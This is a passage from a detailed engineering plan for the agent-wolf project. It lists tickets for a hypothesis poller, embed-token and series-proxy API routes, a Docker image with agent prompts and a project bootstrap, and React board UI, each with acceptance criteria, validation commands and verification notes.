    reads the last three `kind=evaluation` memories for that name; on a third consecutive
    `indeterminate` for a condition it writes `attention: [{condition_id, reason, since_ms}]` into
    the evaluation JSON body and appends ` attention=<n>` to the summary line. The state does not
    change. Deriving the counter from memory rather than from a field is what makes a restart not
    reset it; appending to the summary line is what makes the write land, since the appearance of
    `attention` is itself a change to line 1. (W8's parser ignores unrecognised `key=value` tokens,
    which is what makes this extension safe.)
  - Any condition `tripped` ⇒ transition `live → challenged` through W5's machine, writing the
    trusted `kind=hypothesis, status=challenged` memory with the **full evaluation snapshot
    embedded**, reason `condition_tripped`.
  - `horizon_days` elapsed since go-live with nothing tripped ⇒ also `challenged`, with reason
    `horizon_reached`, so the UI can say "time's up, verdict?" rather than "your thesis failed".
  - **The poller is idempotent.** A hypothesis already `challenged` is not re-transitioned and
    writes no second state memory; self-transitions are no-ops (owner decision **B3**, which is what
    makes this criterion mean anything). Asserted by running the poller twice over the same data and
    counting `POST /agent/memories` calls.
  - **Tick sessions are swept without consulting status.** List
    `GET /agent/sessions?user_email=*&worker=researcher-<id>`, order by `created_at` descending, and
    delete every session past the 7th **whose id is not the `session_id` of any delivery currently
    `pending` or `running` for that worker**. Orange has no "completed" session status: a finished
    tick session reads `running`/`active` for up to 30 minutes and `archived` only afterwards, so a
    status filter either sweeps nothing on a stack with a long idle timeout or deletes a session
    that is at that moment mid-`dataset_put`.
  - **The in-flight exclusion is ONE predicate, shared with W9's teardown (R112).** The sweep rule
    above — never delete a session that is the `session_id` of a delivery currently `pending` or
    `running` for that worker — is exported as a single helper and **W9's teardown step 4 is
    changed to use it**. W9 shipped step 4 literally ("delete every row it returns") because it was
    never given the exclusion, which contradicts its own bullet three lines below ("a tick session
    still in flight is allowed to finish"): a `/verdict` or `/retire` issued while a tick is running
    can delete that tick's session row out from under it, mid-`dataset_put`. W10 is the ticket that
    has to write the predicate anyway, so it lands here rather than reopening W9. A test drives
    teardown with one `running` delivery for the worker and asserts that session is **not** deleted
    while the others are — and W9's existing teardown-order test must still pass unchanged, so the
    fix cannot quietly reorder the five steps.
  - **Failure handling is enumerated and per-hypothesis.** A `404` from the dataset metadata route
    means "never written yet": skipped with a log line, not an error and not an evaluation. A
    `WolfError` of kind `unavailable` skips that hypothesis for this tick without penalty. Any other
    kind is logged at `error` and the hypothesis is skipped. `not_found` and `unavailable` must stay
    distinguishable (§ "Shared error taxonomy") — conflating them makes a provider outage look like
    a missing metric. No throw escapes the interval callback, and one hypothesis's failure never
    stops the rest; a test drives a hypothesis that throws and asserts the next one is still polled.
  - **The poller does not read `GET /agent/attention-requests`.** Attention raised from inside a
    container by `request_human_attention` is surfaced by W8's detail route, which owns
    `api/src/routes/hypotheses.ts`; a poller that read the rows and exported them would be dead code
    the criterion vacuously satisfies. Over HTTP attention is read-only — the `AttentionRequests`
    constant in `go/httpapi/httpapi.go` is registered `GET`-only — and the `challenged` state on the
    board is Wolf's notification surface.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn test src/hypothesis/poller src/hypothesis/points src/hypothesis/store src/hypothesis/provision src/config && yarn typecheck`
  - Confirm the vitest summary reports **5 test files**. ⚠️ The `provision` and `config` legs were
    added 2026-08-22 with the R112 fold and the compose entry; without them neither is gated by
    anything (the **R117** class of defect). `api/vitest.config.ts` includes
    `src/**/*.test.ts` only, and a positional filter that matches nothing runs zero files and exits
    **0**.
- **Depends on:** W9
- [x] done
- Notes: **Wave 7 phase A, 2026-08-22 — passed, zero fix rounds.** `10626bc`, 13 files, +3133/-21;
  `api/` went 887 → 962 on the branch and **975 / 30 files** on merged `main`. The verifier drove
  rather than read: **eleven** implementation mutations each reddening a named test — including the
  plan's own named trap (the version-invariant branch), a swap of teardown steps 1 and 2 (which
  reddened W9's ORDER test, proving the R112 fold did not quietly reorder them), and deleting the
  compose entry (which reddened the wave-6 enforcer). It also wrote three tests of its own, fed 16
  CSV inputs to the parser by hand, and ran one probe **beyond** the ticket: widening the board
  filter so an already-`challenged` hypothesis is re-polled left the idempotence test green, which
  shows idempotence rests on W5's self-transition rule rather than on the status filter — the
  stronger property. `git diff main...HEAD --numstat -- api/src/config.test.ts` is `52 0`: the
  enforcer is untouched. Two **minor** defects stand (**R122**), plus five discovered issues
  (**R122**–**R124**).

### W11: Embed tokens and the series proxy   [Status: done | Model: sonnet — run on opus]
- **Scope:** `GET /api/hypotheses/:id/embed-token` and `GET /api/hypotheses/:id/series/:metric` —
  the two routes the browser needs and the only two places Wolf hands the UI something that came
  from Orange. Both are read-only; neither changes hypothesis state.
- **Repo:** agent-wolf
- **Files:** create `api/src/routes/embed.ts`, `api/src/routes/embed.test.ts`,
  `api/src/routes/series.ts`, `api/src/routes/series.test.ts`; modify `api/src/app.ts` (mount both
  routers), `api/src/config.ts`, `.env.example` (`ORANGE_PUBLIC_URL`), **`docker-compose.yml`** and
  **`api/src/config.test.ts`** *(both added 2026-08-24: mandatory for ANY new config variable since
  R111's enforcer, and omitted here exactly as in R81/R86/R94/R98/R110 — the ninth instance)*, and
  **`api/src/app.test.ts`** *(the mount cases, R133)*. Routes are mounted under the
  literal `/api` prefix — no proxy rewrites it (**R37**).
- **Acceptance criteria:**
  - The embed token is minted through `POST /agent/embed-token {session: "hyp-<id>"}` with
    `WOLF_API_KEY`, **sending no `ttl_seconds` at all**, so Orange applies its own 900s default:
    `clampEmbedTTL` treats absent-or-zero as the default and clamps anything else to `[60, 3600]`
    (`go/cmd/agentd/embedtoken.go`). Hazard H1 means the token carries project-wide authority for
    its lifetime, so the TTL is its only bound and the 3600s ceiling is never asked for. A test
    asserts the outbound body contains no `ttl_seconds` key.
  - **The response is `{ token, expires_at_sec, embed_url }`, and `expires_at_sec` is unix
    SECONDS.** Orange returns the token's own `exp` claim in seconds (`embedTokenResponse.ExpiresAt`
    in the same file). The unit is in the name because W13 computes a T-120s refresh from it, and
    subtracting 120 from milliseconds or 120 000 from seconds gives a token that either never
    refreshes or refreshes instantly — invisible in either ticket's own tests.
  - **`embed_url` is `${ORANGE_PUBLIC_URL}/embed/session/hyp-<id>`** — the *browser-reachable*
    Orange origin (`http://localhost:8080` in the compose stack), read from `ORANGE_PUBLIC_URL` in
    `api/src/config.ts` and documented in `.env.example`. It is deliberately **not** the address
    wolf-api itself uses (`http://localhost:8099`, inside DinD's network namespace and unreachable
    from a browser). Without this field W13 has to hard-code an origin into the React bundle, which
    breaks every non-compose deployment. `ORANGE_PUBLIC_URL`'s origin must also appear in O8's
    `AGENTKIT_PROJECT_MAP` `allowed_origins`, or the embed page's `frame-ancestors` CSP blocks the
    iframe outright (`go/cmd/agentd/embedcsp.go`) — say so in the `.env.example` comment.
  - The token is returned in the JSON body for the client to append as a URL **fragment**; the route
    never builds the fragment itself and never logs the token. A test asserts that neither the token
    nor `WOLF_API_KEY` appears in any captured `pino` line.
  - A caller with no valid `wolf_session` cookie gets **401** and no token: W8's `requireSignedIn`
    guards both routes, and a test asserts no upstream request was made at all.
  - A hypothesis whose `hyp-<id>` session does not exist is **404 `not_found`**. Orange answers 404
    for absent and for another project alike and Wolf does not distinguish either — the route is not
    an existence oracle.
  - **The series route proxies bytes server-side and never redirects the browser to Orange.** Orange
    sets no CORS headers by design, so a redirect or a client-side fetch would fail; a test asserts
    the response is `200` with a JSON body, never a `3xx`.
  - It reads `GET /agent/datasets/<id>-<metric>` (the **bare** metadata object) and then
    `GET /agent/datasets/<id>-<metric>/download`, both with `WOLF_API_KEY`. It never mints an O4
    dataset token: those exist so a container can `curl` a URL, and a server that already holds the
    project key has no use for one.
  - **The response is `{ points, unit, version, fetched_at_ms, state }`**, where `points` is
    `Point[]` — W4's pinned `{ tMs, v }`, unix **milliseconds** — and `state` is exactly one of
    `"ok" | "never_fetched" | "stale"`:
    - a `404` from Orange (the dataset has never been written) returns **200** with `points: []`,
      `version: 0` and `state: "never_fetched"`, never a `500`;
    - a dataset whose newest observation is older than the spec's `staleness_days` returns its
      points with `state: "stale"`, which is what lets W14 render "stale, with its reason" instead
      of a flat line or a silent gap;
    - otherwise `state: "ok"`.
    "Never written yet" and "the last tick failed" are different renderings and therefore different
    values, not one marker.
  - `unit` is the metric's `unit` from the locked `kind=hypothesis-spec` memory; a `:metric` that
    names no slug in that spec is **404 `not_found`**, not an empty series.
  - `version` is the dataset version the points came from, so the UI can say which snapshot it is
    looking at, and `fetched_at_ms` is when Wolf read it — unix **milliseconds**, per the plan's own
    rule that every timestamp encodes its unit in its name.
  - **Parsing uses W10's parser and nothing else** — the entry point is **`parseCanonicalCsvBytes`**
    (`api/src/hypothesis/points.ts:187`), a three-line UTF-8 wrapper over `parseCanonicalCsv`
    (`:116`), because this route holds an `ArrayBuffer`. *(Corrected 2026-08-24; the ticket named
    the string-taking function, which is not the right entry point and is not a second parser.)* — one canonical-CSV parser in the
    tree. A malformed dataset fails the request loudly as `invalid` naming the offending line rather
    than rendering a broken chart; the graded rejection list is W10's, and a test here asserts one
    of them (a wrong header) surfaces as a 400 rather than as an empty series.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn test src/routes/embed src/routes/series && yarn typecheck`
  - Confirm the vitest summary reports **2 test files**. `api/vitest.config.ts` includes
    `src/**/*.test.ts` only, and a positional filter that matches nothing runs zero files and exits
    **0**.
- **Depends on:** W9, W10 *(W10 owns `parseCanonicalCsv`; W11 imports it rather than shipping a
  second parser, which also serialises the two siblings that would otherwise both edit shared
  files)*
- [x] done — verified by the orchestrator 2026-08-24, zero fix rounds. Merged to `main` as `5204267`; wolf main gated green after the merge (api **1018 tests / 32 files**, up from 975 / 30; web 15 / 2; both typechecks clean).
- Notes: **Verified directly by the orchestrator, not by a verifier agent** — the implementer and the verifier both went idle without delivering a report (see **R131**), so the gate was held by hand. Ticket Validation reproduced exactly: `yarn test src/routes/embed src/routes/series` reports **2 test files / 37 tests**. **All nine mutations were caught**: sending `ttl_seconds: 3600`; logging the token; dropping `requireSignedIn` from each route in turn; returning `expires_at_sec` in milliseconds; collapsing `stale` into `ok`; making a no-observation series `ok`; turning `never_fetched` into `stale`; and making an unknown metric slug anything other than `404`. Two blocking checks passed explicitly: `api/src/config.test.ts` has **zero deletions** — the R111 enforcer block is untouched and W11 only added a `describe` beside it — and there is **one** CSV parser, `parseCanonicalCsvBytes` (`api/src/hypothesis/points.ts:187`) being a two-line UTF-8 wrapper over W10's `parseCanonicalCsv` (`:116`), the same wrapper `poller.ts` already used. The 401 tests assert *no upstream request was made*, not merely the status; the proxy test fetches with `redirect: "manual"` so a `3xx` would surface as one; no O4 dataset token is minted; and `.env.example` carries the `allowed_origins` / `frame-ancestors` warning including that a missing origin fails **with no error on the Wolf side at all**. § "Wolf API routes" still shows this route returning `{ points:[{t,v}], unit, version,
  fetched_at }`. That line predates the pinned `Point` type and the pinned unit rule; the shape in
  the criteria above is the authority and the Interfaces line should be corrected to match.

### W12: Wolf image, prompts and project bootstrap   [Status: done | Model: sonnet]
- **Scope:** The installation image, the script that gets it into DinD, the four prompt files, and
  an idempotent bootstrap that configures the `wolf` project end to end. This ticket is the only
  thing that creates the two project-level workers, so the `interviewer` worker W8 names on every
  session create exists because of this ticket or not at all — and the failure mode is a session
  create rejected for an unknown worker, nine tickets later, at X1.
- **Repo:** agent-wolf
- **Files:** create `installations/wolf/Dockerfile`, `scripts/load-image-into-dind.sh`,
  `prompts/interviewer.md`, `prompts/researcher-preamble.md`, `prompts/researcher-method.md`,
  `prompts/critic.md`, `api/src/bootstrap/bootstrap-project.ts`,
  `api/src/bootstrap/bootstrap-project.test.ts`, and a thin `scripts/bootstrap-project.ts` that
  only imports and runs the former; modify `api/src/config.ts` and `.env.example`
  (`WOLF_BASE_IMAGE`, `WOLF_CRITIC_CRON` only).
  The test lives under `api/src/` deliberately: `api/vitest.config.ts` sets
  `include: ["src/**/*.test.ts"]`, so a test at repo-root `scripts/` matches **zero files** and
  `yarn test` exits 0 having proven nothing. `api/src/config.ts` and `.env.example` are on the
  shared-ownership row (W1, W16, W21) — run strictly serial with those tickets and add only the two
  variables named above.
- **The pinned strings — every one of these is a contract with another ticket:**
  - MCP server name is **`wolf`**, so the tools are `mcp__wolf__series_search` /
    `mcp__wolf__series_fetch` (`go/agentdb/sessions.go:49-51` derives `mcp__<name>__<tool>`).
  - The stored header is **`X-Wolf-Mcp-Token`** carrying the **bare** token as `${WOLF_MCP_TOKEN}`.
    `"Bearer ${WOLF_MCP_TOKEN}"` **cannot be stored at all**: `MCPServerConfig.Validate`
    (`go/agentdb/sessions.go:62-95`, `envRefPattern` at `:53-55`) rejects any value containing
    `${` that is not a whole-value reference.
  - The preamble's single substitution token is **`{{LOCKED_SPEC_JSON}}`**, alone on its own line.
  - The preamble/method boundary is the literal line **`<!-- WOLF:METHOD-BODY -->`**.
    ⚠️ **W9's splitter must be LINE-ANCHORED** — `split("\n")` then `line.trim() === marker`, never
    `indexOf` or `split` on the bare substring. `prompts/researcher-preamble.md` contains the marker
    **twice**: once as prose inside backticks near the top, and once as the real boundary line. A
    substring split cuts at the prose occurrence and silently makes most of the locked preamble
    mutable. W12 shipped a test pinning "appears as a whole line exactly once" so a future edit
    cannot break this unnoticed (**R93**). Everything
    above it is locked; everything below is the mutable method body.
- **Acceptance criteria:**
  - `installations/wolf/Dockerfile` begins `ARG BASE_IMAGE=agent-orange-core:dev` / `FROM
    ${BASE_IMAGE}` — the same contract and default tag as `installations/example/Dockerfile:15-16`
    — and adds python3, pandas, numpy and duckdb and nothing else.
  - It sets **no** `CMD`, `ENTRYPOINT`, `EXPOSE`, `HEALTHCHECK` or `WORKDIR` (house rule 4;
    `WORKDIR` joined that list on 2026-08-13 after setting it broke every session from `core`).
    Graded by comparing the built image's `.Config.Cmd`, `.Entrypoint`, `.WorkingDir`,
    `.ExposedPorts` and `.Healthcheck` against the base image's — they must be identical.
  - **`scripts/load-image-into-dind.sh` builds the image inside DinD, not on the host.** A
    host-built image is invisible to sessions (`installations/README.md` § "Local": with the
    default `blobarchive` registry `EnsurePresent` is a no-op, so nothing pulls it). The script
    streams `installations/wolf` as a tar build context into the DinD daemon
    (`tar -C installations/wolf -cf - . | docker exec -i "$ORANGE_DIND_CONTAINER" docker build …`),
    defaults the container name to `agent-orange-dind-1`, builds `agent-orange-core:dev` into DinD
    from `$ORANGE_REPO/installations/core` (default `../agent-orange`) when that tag is absent,
    fails naming the exact command when that path does not exist, and is safe to re-run.
  - The script's last step is `docker exec "$ORANGE_DIND_CONTAINER" docker run --rm <tag> python3
    -c "import pandas, numpy, duckdb"`, and a non-zero exit fails the script. A comment states
    that Orange's compose `BASE_IMAGE` must **never** be set to the Wolf tag: `init-sandbox`
    rebuilds the bare harness and tags it with any `BASE_IMAGE` containing no `/`
    (`docker-compose.yml:36-58`), silently shadowing the real image.
  - **The bootstrap creates EXACTLY these atoms, idempotently — a second run creates nothing and
    mutates nothing.** An executor that ships fewer passes no criterion here:
    1. project settings for project `wolf`: `base_image` = `WOLF_BASE_IMAGE` (default
       `agent-wolf:dev`), `attention_channel`, `mcp_config`;
    2. worker `interviewer`, prompt = `prompts/interviewer.md` verbatim, enabled;
    3. worker `critic`, prompt = `prompts/critic.md` verbatim, enabled;
    4. one worker-mode schedule for `critic`, 5-field cron, default `0 4 * * 1`, overridable by
       `WOLF_CRITIC_CRON`. Never a nickname: `go/agentdb/schedules.go:827` refuses `@weekly`.
    Per-hypothesis workers and schedules are W9's and must not appear here.
  - **Settings are written read-merge-write.** `PUT /agent/project-settings` is a whole-object
    replace (`go/agentdb/project_settings.go:136-160`, "every field is written, zero values
    included"), so the script GETs, merges its three fields and PUTs the merged object. A bare PUT
    silently clears `system_prompt`. A test asserts a pre-existing unrelated field survives.
  - `mcp_config` is written as `{"wolf": {"url": "<WOLF_MCP_URL>", "headers":
    {"X-Wolf-Mcp-Token": "${WOLF_MCP_TOKEN}"}}}`, with the URL taken from W1's boot-resolved
    config value, never re-derived here. A test asserts the value satisfies Orange's whole-value
    `${VAR}` rule (no `Bearer` prefix, no partial interpolation).
  - **`attention_channel` is written explicitly EMPTY (`{}`), and that is the criterion.** Orange's
    only channel kind is an outbound webhook needing an http(s) URL
    (`go/cmd/agentd/attention.go:57-103`) and Wolf exposes no receiver; per W10 the `challenged`
    state on the board is the notification surface and the poller reads
    `GET /agent/attention-requests` instead. A comment in the bootstrap says so, so a later reader
    does not "fix" it by inventing a URL.
  - `prompts/interviewer.md` states the **deposit contract**: when the thesis is sharp enough the
    interviewer calls `memory_create` with labels `{kind: "hypothesis-spec-candidate", name:
    "<id>"}`, line 1 a one-line summary and the rest the spec JSON alone (no prose, no fences),
    re-emitting a full replacement on every revision. It states that this memory is **untrusted**,
    that it becomes the locked spec only when a human clicks Go Live, and that the interviewer
    cannot mark a hypothesis live.
  - `prompts/researcher-preamble.md` is a template containing `{{LOCKED_SPEC_JSON}}` exactly once.
    It states the canonical dataset CSV verbatim (header exactly `timestamp,value`, RFC3339 UTC,
    ascending, LF, one metric per dataset, no trailing blank line), the replace-vs-append rule per
    metric `source`, that `allow_shrink` may not be passed without first filing a `research-note`
    saying why, that a `dataset_put` CAS conflict is retried exactly once after re-reading, and
    that the researcher may **propose** an amendment but never enact one and never write a
    `hypothesis`, `hypothesis-spec` or `verdict` memory.
  - `prompts/researcher-method.md` is the initial mutable method body — the text that goes below
    the marker line — and contains no spec values, since the critic may rewrite it freely.
  - `prompts/critic.md` quotes the marker line `<!-- WOLF:METHOD-BODY -->` literally, states that
    the critic must re-emit everything above it byte-for-byte and may rewrite only what is below,
    and requires a rationale on every `worker_prompt_write`.
  - **A prompt-contract test** (in `bootstrap-project.test.ts`, so `yarn test src/bootstrap` grades
    it) asserts these literals: `{{LOCKED_SPEC_JSON}}` occurs exactly once in the preamble and
    nowhere in the method body; `<!-- WOLF:METHOD-BODY -->` occurs in the preamble and in
    `critic.md`; `timestamp,value` occurs in the preamble; `mcp__wolf__series_search` and
    `mcp__wolf__series_fetch` occur in the method body; `hypothesis-spec-candidate` occurs in
    `interviewer.md`.
  - The idempotency test runs the script twice against an `undici` `MockAgent` Orange and asserts
    the set of create/PUT calls on run 2 is empty.
  - **The report-layer obligations on these two prompt files are W25's, not W12's.** W25 creates
    `prompts/report-authoring.md` and edits `interviewer.md` (also produce a `report-candidate`)
    and `researcher-preamble.md` (write a `kind=report` memory each tick, filling only declared
    slots). W12 therefore leaves both files sectioned so that edit is purely additive, and both go
    on the § "Parallelism and file ownership" table as W12 → W25, strictly serial.
- **TDD:** no for the Dockerfile, the loader script and the prompt prose; **yes** for the bootstrap
  and the prompt-contract test.
- **Validation:**
  - `cd api && yarn test src/bootstrap && yarn typecheck` — and confirm vitest reports **0
    skipped**; a `.skip` left in the suite vacates the idempotency criterion silently
  - with agent-orange's stack up: `./scripts/load-image-into-dind.sh` — must exit 0 and print the
    `import pandas, numpy, duckdb` success line
  - `docker exec "${ORANGE_DIND_CONTAINER:-agent-orange-dind-1}" docker image inspect
    --format '{{json .Config.Cmd}}|{{.Config.WorkingDir}}|{{json .Config.ExposedPorts}}'
    agent-wolf:dev agent-orange-core:dev` — the two lines must be identical (house rule 4)
- **Depends on:** W2, W7 *(W2 owns `api/src/orange/client.ts` and its route list is closed, so the
  project-settings read-merge-write helper, worker create and schedule create must come from W2 —
  do not hand-roll a second HTTP client here; W7 defines the MCP server this config points at)*
- [x] done — verified 2026-08-21, 16/16 criteria, one fix round (the DinD path was unproven)
- Notes: **Implemented, FAILED independent verification, fixed, re-verified 2026-08-21 — 16 of 16
  criteria PASS after one fix round.** Branch `W12-wolf-image-prompts-bootstrap`, commits ending
  `a9c79e6`, merged to `main`. The round-0 failure was **THE VALIDATION RULE**, not a bug: the
  loader script's happy path had never been executed against a real DinD daemon, so "builds the
  image inside DinD" and "prints the import pandas, numpy, duckdb success line" were *unproven*.
  The fix round ran it for real against a throwaway DinD and the criteria became provable. Every
  pinned contract string was checked byte for byte by the verifier: MCP server name `wolf`, header
  `X-Wolf-Mcp-Token` carrying the **bare** `${WOLF_MCP_TOKEN}`, `{{LOCKED_SPEC_JSON}}` alone on its
  line, `<!-- WOLF:METHOD-BODY -->` exact. The Dockerfile sets none of the five forbidden
  directives. Four minor defects accepted: `readWorker` issues a raw `fetch` outside
  `orange/client.ts` because W2's closed route list has no worker **read** and idempotency is
  impossible without one (**R91**); `python3-pip` is one apt package beyond the criterion's literal
  four; the core-fallback build hardcodes `BASE_IMAGE=agentkit-sandbox:dev` and ignores an operator
  override; and 68 lines landed in `api/src/config.test.ts`, which was on no Files line and no
  ownership row (**R94**). 13 guesses. Found **R91**, **R92**, **R93**, **R94**.
### W13: UI — board, new hypothesis, chat frame   [Status: done | Model: sonnet — run on opus]
- **Scope:** `HypothesisList`, `NewHypothesis`, `Archive`, `OrangeChatFrame`, `StatusChip`,
  `TamperWarning`, and the app shell: the router, sign-in, and the two browser-side build
  variables. This is the first ticket to need a router and a DOM-testing library, so it installs
  both from § "Pinned technology choices" — W14 and W24 inherit whatever it wires.
- **Repo:** agent-wolf
- **Files:** create `web/src/pages/HypothesisList.tsx`, `web/src/pages/NewHypothesis.tsx`,
  `web/src/pages/Archive.tsx`, `web/src/components/OrangeChatFrame.tsx`,
  `web/src/components/StatusChip.tsx`, `web/src/components/TamperWarning.tsx`, `web/src/env.ts`
  (the one place `import.meta.env` is read), and a `.test.tsx` beside each component and page;
  modify `web/src/App.tsx`, `web/package.json`, `web/Dockerfile`, `docker-compose.yml` (build args
  on `wolf-web`), `.env.example` (the two `VITE_*` defaults).
  `web/package.json` is on the shared-ownership row with W23, W24 and **W28**, and `.env.example`
  with W1, W16 and W21 — run strictly serial with those and add only what is named here.
  **Revision 5:** W28 has already installed `@agentkit/chat-ui`, written `web/src/theme.ts` and set
  `test.server.deps.inline` in `web/vite.config.ts`. Do not add a second theme, do not re-add the
  package, and **use `Provenance`/`Severity` from `web/src/components/trust/` rather than inventing
  a treatment** — that is the whole point of W28 running first.
- **Acceptance criteria:**
  - **Router: React Router 7** per § "Pinned technology choices". One route table, in
    `web/src/App.tsx`: `/` (board), `/new`, `/archive`, `/hypotheses/:id` — the last a placeholder
    component W14 replaces. W24 adds the go-live review route to the same table; do not add a
    second router or a second table.
  - **`@testing-library/react` 16.x + `@testing-library/jest-dom`** are installed (jsdom is already
    the vitest environment in `web/vite.config.ts`). The criteria below cannot be asserted without
    them, and W23 must find them already present rather than adding a second copy.
  - **Two build args, because `wolf-web` ships as a built nginx image and cannot read runtime env.**
    `VITE_ORANGE_PUBLIC_URL` (default `http://localhost:8080` — Orange's *browser-reachable*
    origin, **not** `WOLF_MCP_URL` and not the DinD gateway) and `VITE_GOOGLE_CLIENT_ID`, declared
    as `ARG`/`ENV` in `web/Dockerfile`'s build stage, passed through `build.args` on the `wolf-web`
    service, documented in `.env.example`, and read **only** in `web/src/env.ts`.
  - 🔴 **`OrangeChatFrame` is a full-height RAIL, not a block in a document** (UI design § 5).
    It renders at `height: 100%` inside a container the page gives `position: sticky; top: 0;
    height: 100vh`, width `clamp(340px, 28vw, 460px)`, collapsible, and below the `md` breakpoint it
    becomes a tab rather than a fixed-height box. This is what makes the frame's height *known*
    without measuring it, which a cross-origin frame does not permit. A test asserts the rendered
    frame carries no fixed pixel height.
  - `OrangeChatFrame`'s `src` is `${VITE_ORANGE_PUBLIC_URL}/embed/session/hyp-<id>#token=<token>`,
    composed from the variable — a test stubs the variable and asserts the rendered `src`, so a
    hard-coded origin fails. The session name carries the `hyp-` prefix and the id does not
    (§ Vocabulary); do not double it. That origin must also appear in O8's `allowed_origins` entry
    or Orange's CSP `frame-ancestors` blocks the frame outright.
  - **The embed token's expiry is `expires_at_sec`, unix SECONDS**, passed through from Orange
    verbatim (`go/cmd/agentd/embedtoken.go:62-68` states the unit). `OrangeChatFrame` re-mints and
    remounts when `expires_at_sec * 1000 - Date.now() <= 120_000`. A fake-timer test pins that
    boundary with a fixture whose `expires_at_sec` is a 10-digit number — mixing the unit gives a
    token that either never refreshes or refreshes instantly, and neither is visible in a test
    whose fixture the same executor invented.
  - The token is held in component state only: a test asserts nothing is written to
    `localStorage` or `sessionStorage` across a mount, a refresh and an unmount.
  - The board renders from a **single** `GET /api/hypotheses` response with no per-card follow-up
    request; a test with twelve hypotheses asserts exactly one fetch.
  - 🔴 **The board is an ATTENTION QUEUE, not a chronological list** (UI design § 4). Rows are
    grouped into `NEEDS A HUMAN` / `WATCH` / `IN INTERVIEW` / `HOLDING`, by the membership rules and
    sort orders pinned there, from the tier W27 computes **server-side** — the single-fetch criterion
    below is unaffected. `HOLDING` is collapsed with a count. An **empty** `NEEDS A HUMAN` section
    renders its heading with a count of zero rather than hiding: "nothing needs you" must be
    visible, not inferred. The heading says *a human*, not *you* — anyone allowlisted may act on
    anything (`owner` is a byline).
  - Each card renders title, `owner` as a byline, `StatusChip`, `support_score`, the condition summary, and `headline`
    — line 1 of the newest `kind=report` snippet, added to the board payload by W22, so W13's own
    tests drive it from fixtures. `headline: null` renders a distinct "no report yet" state — never
    an empty string, and never omitted, so "said nothing" and "nothing yet" stay distinguishable.
  - **All six lifecycle states render a distinct, labelled chip**, enumerated: `draft`, `live`,
    `challenged`, `confirmed`, `invalidated`, `archived`. A table test covers all six; an unknown
    value renders verbatim rather than throwing or falling back to `draft`.
  - **The Go Live gate has exactly one server-side source.** `GET /api/hypotheses/:id` carries
    `spec_validation: { valid: boolean, errors: [{ path, message }] }`, computed by W8 with W3's
    validator over the newest `kind=hypothesis-spec-candidate` memory. The button is disabled iff
    `spec_validation.valid === false` and lists `path: message` for every error. **`web/` never
    imports the validator** — that would put the go-live gate in two places, and W1's import
    boundary would permit it. W9's `422` is the backstop for a race, not the UI's source of truth.
    W24 extends this gate with the accepted-template condition; W13 ships the spec half.
  - **`TamperWarning` is graded on the pinned `Tamper` shape** (§ "Shared shapes"):
    `{ reason, written_by_worker, written_by_session, memory_id }`, all fields present, the unused
    provenance field `""`. It renders a full-width MUI `Alert severity="error"` naming
    `written_by_worker || written_by_session` and the `memory_id`, and distinguishes all three
    reasons in words: `forged_row`, `hostile_retraction`, `cross_hypothesis_write`. A test covers
    each of the three. This is a security signal — a subtle icon fails the criterion.
  - The Archive page shows `restated_from` lineage when the label is present, linking to the
    retired hypothesis; without it, archive-and-relaunch reads as a fresh thesis.
  - `NewHypothesis` posts `{ title }`, expects **201**, and surfaces Orange's create error verbatim
    — "host port pool is exhausted" is operational and actionable, and must not be flattened.
- **TDD:** yes for the token-refresh boundary, the single-fetch board, the Go Live gate, the chip
  table and the three tamper reasons; no for layout.
- **Validation:**
  - `cd web && yarn test && yarn typecheck` — confirm vitest reports **0 skipped**; a `.skip`
    silently vacates a criterion here, and five of them are single tests
  - `docker build -f web/Dockerfile --build-arg VITE_ORANGE_PUBLIC_URL=http://localhost:8090
    --build-arg VITE_GOOGLE_CLIENT_ID=probe.apps.googleusercontent.com -t wolf-web:vtest .`
    then `docker run --rm wolf-web:vtest grep -rq 'localhost:8090' /usr/share/nginx/html` —
    **empirical, not declarative**: it proves the build arg reaches the bundle Vite inlined, which
    `docker compose config` cannot
  - `dcc` (the redacted wrapper, § "Executor orientation" — **R82**) shows both args under
    `wolf-web`'s `build.args`
- **Depends on:** W11, **W8b**, **W28** *(revision 5: W28 owns `web/package.json`'s package install, `web/src/theme.ts`, `web/vite.config.ts`'s `deps.inline`, and the two trust components — this ticket's criteria assume all four already exist)* *(the signed-in state and the sign-out action come from `GET /api/auth/me` and `POST /api/auth/logout`; before W8b existed this ticket would have had to infer them from a 401 on the board — owner decision 2026-08-21, R100)*
- [x] done — verified 2026-08-24, one fix round. Merged to agent-wolf `main` as `5fae67f`; main gated green after (web **21 files / 194 tests**, api **32 / 1020**, 0 skipped, both typechecks clean, `yarn build` clean, and the `docker build` + bundle-grep probe green).
- Notes: Implemented `f6c3c59`, fix round `245e3f6`. Its verifier ran **51 mutations and caught 48**, re-running every Validation command itself rather than trusting the report. Proven red among others: dropping the `* 1000` on `expires_at_sec`; the refresh margin at `120`, `119_000` and `121_000`; a static frame `key` (refresh without remount) and a cached token (remount without re-mint); a hard-coded frame origin; a doubled `hyp-` prefix; a `sessionStorage` write; a per-card board fetch; `!valid` on the go-live gate and a dropped error list; two lifecycle states collapsed onto one label and an unknown status falling back to `draft`; one sentence for all three tamper reasons, and `Alert severity` flipped `error`→`warning`; an unclassified tier silently placed in HOLDING; the client re-deriving the tier from `status`/`tamper`; WATCH sorted best-first; the heading reworded "NEEDS YOU"; empty sections hidden; the rail set `position: static` or given a fixed pixel height; a flattened create error; `support_score` coloured by sign. **The implementer caught its own vacuous test before the verifier did** — its first mutation run showed the token-boundary tests computing their advance *from* `REFRESH_MARGIN_MS`, so they moved with the bug and stayed green; rewritten to hard-code `479_999`/`480_001` with the constant asserted separately. **Three mutations stayed green**; one was benign (`!valid` is identical to `=== false` over a `boolean`), two were closed in the fix round — the below-`md` tab branch was entirely unexecuted because jsdom defines no `matchMedia` (**R139**), and no fixture drove an absent `spec_validation` (**R140**, which turned out to be a real crash, not just a gap). **The implementer logged 40 guesses**, twelve flagged as binding on later tickets; the load-bearing ones are recorded in **R138** and in W14/W23/W24's Notes. Two ownership rules were broken and both were adjudicated **true and justified** — `web/src/setupTests.ts` gained `afterEach(cleanup)` (removing it fails **39 tests across 12 files**; RTL self-registers cleanup only under `globals: true`, which `vite.config.ts` deliberately does not set), and `web/Dockerfile` gained `COPY web/vendor` (**R137** — the image build had been broken on `main` since W28 landed).

### W14: UI — detail, scoreboard, conditions and verdict   [Status: done | Model: sonnet — run on opus]
- **Scope:** `HypothesisDetail` with the scoreboard, the metric charts, the condition table, the
  timeline and the human verdict/amendment actions. Everything it renders comes from
  `GET /api/hypotheses/:id` and `GET /api/hypotheses/:id/series/:metric`; this ticket adds no
